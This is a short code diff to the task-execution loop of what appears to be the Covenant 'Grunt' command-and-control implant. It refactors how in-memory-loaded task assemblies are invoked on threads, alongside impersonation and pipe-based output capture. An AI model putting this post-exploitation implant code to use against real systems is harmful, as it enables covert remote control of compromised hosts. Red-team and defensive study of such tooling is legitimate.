@@ -83,6 +83,7 @@ namespace GruntExecutor
                     messenger.WriteTaskingMessage();
                 }
                 catch (Exception) { }
+                
                 List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                 WindowsImpersonationContext impersonationContext = null;
                 Random rnd = new Random();
@@ -251,13 +252,13 @@ namespace GruntExecutor
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
                         PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
                         string results = "";
-                        Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
                         if (streamProp == null)
                         {
-                            invokeThread.Start();
+                            results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                         }
                         else
                         {
+                            Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
                             using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                             {
                                 using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
@@ -297,8 +298,8 @@ namespace GruntExecutor
                                     }
                                 }
                             }
+                            invokeThread.Join();
                         }
-                        invokeThread.Join();
                         output += results;
                     }
                 }
